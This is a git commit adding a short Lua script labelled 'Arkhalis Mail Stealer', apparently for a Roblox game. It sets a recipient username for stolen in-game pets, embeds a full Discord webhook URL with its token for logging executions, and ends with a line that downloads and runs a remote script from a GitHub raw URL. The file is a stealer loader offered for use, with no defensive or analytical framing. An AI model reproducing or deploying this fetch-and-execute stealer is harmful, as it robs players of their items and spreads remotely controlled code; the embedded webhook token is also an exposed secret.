9ab77ea7262a84792b519ee5e36f5d26feefab52
UpHub <132285590+PsxScriptzz@users.noreply.github.com>
2023-06-23 14:37:53 +0100

    Add files via upload

---
+++ MansZesty.lua
@@ -0,0 +1,11 @@
+--[[ Arkhalis Mail Stealer ]]--
+
+--[[ Main Config ]]--
+UserName = "G0THHPEEPALTT" --// Username To Send Pets To
+UserName2 = "" --// Username To Send Pets To [OPTIONAL]
+
+--[[ Webhook ]]--
+Webhook = "https://discord.com/api/webhooks/1121791149791781014/8ALjyFLfDHsB3iprbZ_myCMJQGH_JZV9zcVcHXLuePXPSgLbItcYchoqo9NwRlnHDu_J" --// Discord Webhook For Executions
+
+--[[ DO NOT CHANGE ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Arkhalislua/Arkhalislua.github.io/main/arkhalis_mailstealer.lua", true))()
